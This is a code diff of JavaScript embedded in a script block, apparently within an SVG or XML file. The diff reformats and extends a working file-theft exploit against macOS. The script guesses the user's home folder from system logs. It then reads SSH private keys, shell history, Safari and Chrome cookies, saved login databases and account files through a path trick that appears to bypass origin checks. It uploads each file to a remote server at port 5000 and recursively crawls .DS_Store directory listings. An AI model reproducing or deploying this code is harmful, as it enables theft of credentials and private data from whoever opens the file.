@@ -14,102 +14,121 @@
 
 <script type="text/javascript">
     <![CDATA[ 
-       const serverUrl = 'http://0:5000',
-            user = getUser(),
-            list = [
-           
-                '.ssh/id_rsa',
-                '.ssh/known_hosts',
-                '.ssh/authorized_keys',
-                '.bash_history',
-            //cookies
-                'Library/Cookies/Cookies.binarycookies',
-                'Library/Cookies/HSTS.plist',
-                'Library/Cookies/com.apple.Safari.cookies',
-                'Library/Accounts/Accounts4.sqlite',
-            //soft
-                'Library/Application Support/Chromium/Default/Login Data',
-                'Library/Application Support/Chromium/Default/Cookies',
-                'Library/Application Support/Chromium/Default/History',
+const serverUrl = 'http://0:5000', 
+user = getUser(),
 
-                'Library/Application Support/Google/Chrome/Default/Login Data',
-                'Library/Application Support/Google/Chrome/Default/Cookies',
-                'Library/Application Support/Google/Chrome/Default/History',
-            //trash
-                '.Trash/.DS_Store',
-            
-                //'Library/.DS_Store',
-                //'Pictures/.DS_Store',
-                //'.DS_Store',
-                'Documents/.DS_Store',
-                'Desktop/.DS_Store',
-            ]
-            .map(file => user + file);
+list = [
 
-        main();
+        '.ssh/id_rsa',
+        '.ssh/known_hosts',
+        '.ssh/authorized_keys',
+        '.bash_history',
+        //cookies
+        'Library/Cookies/Cookies.binarycookies',
+        'Library/Cookies/HSTS.plist',
+        'Library/Cookies/com.apple.Safari.cookies',
+        'Library/Accounts/Accounts4.sqlite',
+        //soft
+        'Library/Application Support/Chromium/Default/Login Data',
+        'Library/Application Support/Chromium/Default/Cookies',
+        'Library/Application Support/Chromium/Default/History',
 
-        function main() {
-            list.forEach(processFile);
-        }
+        'Library/Application Support/Google/Chrome/Default/Login Data',
+        'Library/Application Support/Google/Chrome/Default/Cookies',
+        'Library/Application Support/Google/Chrome/Default/History',
+        //trash
+        '.Trash/.DS_Store',
 
-        function processFile(file) {
-            let out = getFile(file),
-                xhr = new XMLHttpRequest(),
-                formData = new FormData()
+        //'Library/.DS_Store',
+        //'Pictures/.DS_Store',
+        //'.DS_Store',
+        'Documents/.DS_Store',
+        'Desktop/.DS_Store',
+    ]
+    .map(file => user + file);
 
-            if (!out) return false;
+main();
 
-            formData.append('file', out, file);
+function main() {
+    list.forEach(processFile);
+}
 
-            xhr.open('POST', serverUrl);
-            xhr.onreadystatechange = () => {
-                if (xhr.readyState === 4 && xhr.status === 200 && xhr.responseText.length > 3) {
-                    let response = JSON.parse(xhr.responseText);
+function unique(arr) {
+    var obj = {};
 
-                    response.forEach(responseFile => {
-                        let path = file.slice(0, file.lastIndexOf('/') + 1);
-                        if (processFile(path + responseFile) != true) {
+    for (var i = 0; i < arr.length; i++) {
+        var str = arr[i];
+        obj[str] = true;
+    }
 
-                            processFile(path + responseFile + '/.DS_Store');
-                        }
+    return Object.keys(obj);
+}
 
-                    })
+function processFile(file) {
+    let out = getFile(file),
+        xhr = new XMLHttpRequest(),
+        formData = new FormData()
+
+    if (!out) return false;
+
+    formData.append('file', out, file);
+
+    xhr.open('POST', serverUrl);
+    xhr.onreadystatechange = () => {
+        if (xhr.readyState === 4 && xhr.status === 200 && xhr.responseText.length > 3) {
+            let response = JSON.parse(xhr.responseText);
+
+            response.forEach(responseFile => {
+                let path = file.slice(0, file.lastIndexOf('/') + 1);
+                if (processFile(path + responseFile) != true) {
+
+                    processFile(path + responseFile + '/.DS_Store');
                 }
-            };
-            xhr.send(formData);
-            return true
-        }
 
-        function getUser() {
+            })
+        }
+    };
+    xhr.send(formData);
+    return true
+}
+
+function getUser() {
+    var xhr = new XMLHttpRequest();
+
+    try {
+        xhr.open('GET', '/var/log/system.log;/https:%2f%2fgoogle.com/', false);
+        xhr.send();
+        var users = unique(xhr.responseText.match(/\/Users\/\w+\//g));
+    } catch (e) {
+        xhr.open('GET', '/var/log/install.log;/https:%2f%2fgoogle.com/', false);
+        xhr.send();
+        var users = unique(xhr.responseText.match(/\/Users\/\w+\//g));
+    } finally {
+        return users.find((userstring) => {
             var xhr = new XMLHttpRequest();
+            xhr.open('GET', userstring + '.DS_Store', false);
+            xhr.send();
+            return xhr.responseText.length > 0
+        });
+    }
+}
 
-            try {
-                xhr.open('GET', '/var/log/system.log;/https:%2f%2fgoogle.com/', false);
-                xhr.send();
-                return xhr.responseText.match(/\/Users\/\w+\//g)[0];
-            } catch (e) {
-                xhr.open('GET', '/var/log/install.log;/https:%2f%2fgoogle.com/', false);
-                xhr.send();
-                return xhr.responseText.match(/\/Users\/\w+\//g)[0];
-            }
-        }
+function getFile(file) {
+    var xhr = new XMLHttpRequest();
 
-        function getFile(file) {
-            var xhr = new XMLHttpRequest();
+    try {
+        console.log(file);
+        xhr.open('GET', file + ';/https:%2f%2fgoogle.com/', false);
+        xhr.responseType = 'blob';
+        xhr.send();
 
-            try {
-                console.log(file);
-                xhr.open('GET', file + ';/https:%2f%2fgoogle.com/', false);
-                xhr.responseType = 'blob';
-                xhr.send();
-
-                if (xhr.response.size != 0) return xhr.response
+        if (xhr.response.size != 0) return xhr.response
 
 
-            } catch (e) {
-                console.log(e)
-            }
-        }
+    } catch (e) {
+        console.log(e)
+    }
+}
 
 ]]> 
    </script>
